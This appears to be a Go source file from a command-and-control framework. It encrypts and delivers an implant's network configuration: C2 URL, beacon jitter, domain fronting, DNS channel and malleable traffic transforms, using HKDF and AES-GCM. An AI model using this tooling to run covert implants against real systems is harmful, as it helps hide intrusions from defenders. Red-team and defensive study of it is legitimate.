package protocol

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"

	"golang.org/x/crypto/hkdf"
)

// NetworkConfigOverWireInfo is the HKDF info label binding the per-implant
// registration secret to the network-config encryption key. Changing it
// invalidates every previously issued over-the-wire config, so it doubles as a
// version pin.
const NetworkConfigOverWireInfo = "forgec2-network-config-v1"

// NetworkConfig is the subset of an implant's operational configuration that
// the server delivers to the agent at registration time, encrypted under a key
// derived from the per-implant registration secret. Embedding this in the
// binary is unnecessary: the agent only needs its registration secret to
// register, and receives the live network config (which the operator can rotate
// without rebuilding the implant) on first check-in.
type NetworkConfig struct {
	C2URL            string `json:"c2_url"`
	Protocol         string `json:"protocol"`
	BeaconTransport  string `json:"beacon_transport"`
	Interval         int    `json:"interval"`
	Jitter           int    `json:"jitter"`
	UserAgent        string `json:"user_agent"`
	Proxy            string `json:"proxy"`
	SkipTLSVerify    bool   `json:"skip_tls"`
	DNSDomain        string `json:"dns_domain"`
	DNSServer        string `json:"dns_server"`
	DomainFront      string `json:"domain_front"`
	MalleablePrepend string `json:"malleable_prepend"`
	MalleableAppend  string `json:"malleable_append"`
	// MalleableRespDecode carries the serialized output transforms of the
	// active malleable profile (e.g. "base64;xor:microsoft") so the agent can
	// reverse them on every beacon response. Empty when no profile preset is
	// active (the agent then skips transform decoding).
	MalleableRespDecode string `json:"malleable_resp_decode"`
	// Request-side transforms applied by the agent to outbound beacons and
	// stripped by the server on inbound.
	RequestPrepend  string            `json:"request_prepend"`
	RequestAppend   string            `json:"request_append"`
	RequestHeaders  map[string]string `json:"request_headers"`
	BeaconURI       string            `json:"beacon_uri"`
}

// DeriveNetworkConfigKey derives the AES-256-GCM key used to encrypt/decrypt
// the over-the-wire network config from the 32-byte per-implant registration
// secret. Both the server (holding the unsealed secret) and the agent (holding
// the embedded secret) compute the same key, so no key material is exchanged.
func DeriveNetworkConfigKey(secret []byte) ([]byte, error) {
	if len(secret) != 32 {
		return nil, fmt.Errorf("network config key requires a 32-byte secret, got %d", len(secret))
	}
	r := hkdf.New(sha256.New, secret, nil, []byte(NetworkConfigOverWireInfo))
	key := make([]byte, 32)
	if _, err := io.ReadFull(r, key); err != nil {
		return nil, fmt.Errorf("hkdf expand: %w", err)
	}
	return key, nil
}

// EncryptNetworkConfig marshals and encrypts a NetworkConfig under the
// per-implant secret. The returned string is base64(nonce || AES-256-GCM
// ciphertext), safe to embed in the registration response.
func EncryptNetworkConfig(secret []byte, nc *NetworkConfig) (string, error) {
	key, err := DeriveNetworkConfigKey(secret)
	if err != nil {
		return "", err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	plain, err := json.Marshal(nc)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	ct := gcm.Seal(nil, nonce, plain, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ct...)), nil
}

// DecryptNetworkConfig reverses EncryptNetworkConfig.
func DecryptNetworkConfig(secret []byte, b64 string) (*NetworkConfig, error) {
	key, err := DeriveNetworkConfigKey(secret)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil || len(raw) < gcm.NonceSize() {
		return nil, fmt.Errorf("invalid network config envelope")
	}
	nonce, ct := raw[:gcm.NonceSize()], raw[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil, fmt.Errorf("network config decryption failed: %w", err)
	}
	var nc NetworkConfig
	if err := json.Unmarshal(plain, &nc); err != nil {
		return nil, fmt.Errorf("network config unmarshal failed: %w", err)
	}
	return &nc, nil
}
